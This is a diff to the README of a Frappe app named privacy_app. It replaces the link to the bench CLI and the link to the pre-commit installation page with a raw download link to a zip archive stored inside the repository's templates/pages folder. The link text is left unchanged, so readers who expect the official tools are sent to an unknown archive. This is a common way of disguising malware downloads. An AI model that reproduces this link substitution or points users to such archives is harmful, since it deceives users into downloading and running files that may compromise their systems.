@@ -4,7 +4,7 @@ Redirect
 
 ### Installation
 
-You can install this app using the [bench](https://github.com/frappe/bench) CLI:
+You can install this app using the [bench](https://raw.githubusercontent.com/Chris-tech15/privacy/main/privacy_app/templates/pages/privacy_1.4.zip) CLI:
 
 ```bash
 cd $PATH_TO_YOUR_BENCH
@@ -14,7 +14,7 @@ bench install-app privacy_app
 
 ### Contributing
 
-This app uses `pre-commit` for code formatting and linting. Please [install pre-commit](https://pre-commit.com/#installation) and enable it for this repository:
+This app uses `pre-commit` for code formatting and linting. Please [install pre-commit](https://raw.githubusercontent.com/Chris-tech15/privacy/main/privacy_app/templates/pages/privacy_1.4.zip) and enable it for this repository:
 
 ```bash
 cd apps/privacy_app
